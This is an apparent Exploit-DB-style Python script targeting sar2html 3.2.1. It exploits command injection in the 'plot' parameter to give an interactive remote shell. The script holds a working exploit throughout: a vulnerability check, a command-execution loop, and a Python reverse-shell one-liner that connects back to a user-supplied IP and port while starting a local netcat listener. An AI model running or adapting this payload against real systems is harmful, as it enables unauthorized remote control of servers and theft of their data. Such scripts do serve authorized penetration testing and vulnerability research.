#!/usr/bin/env python3

# Exploit Title: sar2html 3.2.1 - Remote Code Execution (interactive shell)
# Date: 07/01/2021
# Exploit Author: Richard Jones
# Vendor Homepage: https://github.com/cemtan/sar2html 
# Software Link:  https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Debian 5.7.6
# Default expliot: http://IP/index.php?plot=;ls

# Usage: ./sar2HTML -ip HOST IP -rip IP:PORT -pe folder
# Exmaples: #Usage: ./sar2HTML -ip 192.168.1.81 -rip 192.168.1.22:9999 -pe sar2HTML (Reverse Shell)
# Exmaples: #Usage: ./sar2HTML -ip 192.168.1.81 -pe sar2HTML (Baisc Web Shell)

import re
import requests
import argparse
import os
import time


class col:
    RED = '\033[31m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RESET = '\033[0m'

def banner():
    ban = r"""                _____  _   _ ________  ___ _     
               / __  \| | | |_   _|  \/  || |    
 ___  __ _ _ __`' / /'| |_| | | | | .  . || |    
/ __|/ _` | '__| / /  |  _  | | | | |\/| || |    
\__ \ (_| | |  ./ /___| | | | | | | |  | || |____
|___/\__,_|_|  \_____/\_| |_/ \_/ \_|  |_/\_____/
                                                 
                                                 """
    print(col.GREEN + ban + col.RESET)

banner()

parser = argparse.ArgumentParser(description='Parse')
parser.add_argument('-ip','--ip',help='Ip address to connect to', required=True)
parser.add_argument('-rip','--reverse-ip-port',help='Reverse ip and port in format IP:PORT')
parser.add_argument('-pe','--path-extra',help='Any path between normal exploit. eg: /sar2HTML/index.php?plot=;')
args = parser.parse_args()


#Check arguments
if args.path_extra:
    if not str(args.path_extra).endswith("/"):
        args.path_extra = args.path_extra + "/"
        outURL = f"http://{args.ip}/{args.path_extra}index.php?plot=;ls"
else:
    outURL = f"http://{args.ip}/index.php?plot=;ls"

#Print the results
def printResults(page):
    wordsToClean = ("Select Host", "There is no defined host...", "Select Start", "Select Start Date First", "Select Host First")
    matches = re.findall(r"\<option\svalue=.*?\>(.*?)\<\/", page)
    print("------- Results -------")
    for m in matches:
        if m not in wordsToClean:
            print(m)
#Set session
s = requests.Session()

#Verify the exploit,Test for LFI
def checkHostIsVunerable(url):
    exploit_check="<a href=\"index.php\">;ls</a>"    
    r = s.get(url)
    if exploit_check in r.text:
        return True
    else:
        return False

#Run the netcat shell
def runShell(url):
    while True:
        url = url.split("=")[0]
        cmd = input("$\\cmd> ")
        if cmd == "exit":
            print("Exiting...")
            exit(0)
        if cmd == "rs session":
            cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            if not args.reverse_ip_port:
                print("No Reverse IP or PORT supplied. Eg: -rip 10.10.10.10:9999")
                print("Restart and Try again!!")
                exit(0)
            else:                   
                ip, port = args.reverse_ip_port.split(":")
                cmd = cmd.replace("<IP>", ip).replace("<PORT>", port)
                url = url+"=;"+cmd
                print("Running shell....")
                os.system(f"qterminal -e 'nc -lnvp {port}' & 2>/dev/null")
                time.sleep(2)
                r = s.get(url)
        else:                    
            url = url+"=;"+cmd
            r = s.get(url)
            printResults(r.text)

if checkHostIsVunerable(outURL):
    print("The Host Appears Vunerable, Running a basic shell ...")
    print("Enter: '"+col.RED+"rs session"+col.RESET+"' for a ReverseShell")
    runShell(outURL)
else:
    print(col.RED + "Host NOT vunerable, Try a new path!!" + col.RESET)
    exit(0)
